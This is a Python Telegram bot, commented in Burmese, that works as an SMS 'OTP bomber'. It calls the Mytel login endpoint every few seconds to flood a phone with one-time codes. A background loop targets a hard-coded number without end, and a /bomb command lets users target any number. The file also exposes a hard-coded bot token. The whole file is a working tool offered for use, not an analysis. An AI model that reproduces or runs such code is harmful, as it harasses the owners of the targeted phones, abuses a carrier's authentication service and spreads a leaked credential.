import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import requests

TOKEN = "8183997269:AAElovxXFRd40oatzEtSnKpVm8UAheNvAQw"
DEFAULT_PHONE = "09663976639"

# Mytel OTP API ကိုခေါ်မည့် Function
def get_otp_from_api(phone_number):
    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone_number}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        response = requests.get(url, headers=headers)
        return response.text
    except Exception as e:
        return str(e)

# 1. Background မှာ Unknown အနေနဲ့ အလိုအလျောက် အမြဲအလုပ်လုပ်နေမည့် Default Bomber
async def background_default_bomber(application):
    delay_seconds = 3
    while True:
        try:
            await asyncio.to_thread(get_otp_from_api, DEFAULT_PHONE)
        except Exception:
            pass
        await asyncio.sleep(delay_seconds)

async def post_init(application):
    application.create_task(background_default_bomber(application))

# 2. အခြား ဖုန်းနံပါတ်အသစ်တွေအတွက် Command Handler (/bomb <phone>)
async def start_custom_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ ကျေးဇူးပြု၍ ဖုန်းနံပါတ် ထည့်ပေးပါ။\nဥပမာ: `/bomb 09912345678`", parse_mode="Markdown")
        return

    phone = context.args[0]
    
    # Default နံပါတ်ရိုက်ထည့်လာပါက Unknown ဟုသာ ပြသရန်
    if phone == DEFAULT_PHONE:
        phone_display = "Unknown"
    else:
        phone_display = phone

    keyboard = [[InlineKeyboardButton("🛑 ရပ်တန့်ရန်", callback_data=f"stop_{phone}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    msg = await update.message.reply_text(
        f"🚀 **ဖုန်းနံပါတ်အတွက် OTP Bomber စတင်နေပါပြီ...**\n\n"
        f"📱 ဖုန်း: `{phone_display}`\n"
        f"🔄 အခြေအနေ: လုပ်ဆောင်နေသည်...",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

    context.user_data[f'stop_{phone}'] = False
    i = 0
    delay_seconds = 3

    while not context.user_data.get(f'stop_{phone}', False):
        i += 1
        await asyncio.to_thread(get_otp_from_api, phone)
        
        try:
            await msg.edit_text(
                f"🚀 **OTP Bomber အလုပ်လုပ်နေဆဲ...**\n\n"
                f"📱 ဖုန်း: `{phone_display}`\n"
                f"🔄 ပို့ပြီးစီးမှု: `{i}` ကြိမ်",
                parse_mode="Markdown",
                reply_markup=reply_markup
            )
        except Exception:
            pass

        for _ in range(delay_seconds):
            if context.user_data.get(f'stop_{phone}', False):
                break
            await asyncio.sleep(1)

    try:
        await msg.edit_text(
            f"🛑 **ဖုန်းနံပါတ် {phone_display} အတွက် Bomber ရပ်တန့်သွားပါပြီ။**\n"
            f"✨ စုစုပေါင်း: `{i}` ကြိမ်",
            parse_mode="Markdown"
        )
    except Exception:
        pass

async def stop_custom_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("ရပ်တန့်လိုက်ပါပြီ!")
    data = query.data
    if data.startswith("stop_"):
        phone = data.split("_")[1]
        context.user_data[f'stop_{phone}'] = True

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **OTP Bomber Bot သို့ ကြိုဆိုပါတယ်**\n\n"
        "📌 အခြားဖုန်းနံပါတ်များ စမ်းသပ်လိုပါက ဤကဲ့သို့ ရိုက်ထည့်ပါ:\n"
        "`/bomb <ဖုန်းနံပါတ်>`",
        parse_mode="Markdown"
    )

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("bomb", start_custom_bomb))
    app.add_handler(CallbackQueryHandler(stop_custom_button, pattern="^stop_", block=False))

    print("Bot အလုပ်လုပ်နေပါပြီ...")
    app.run_polling()
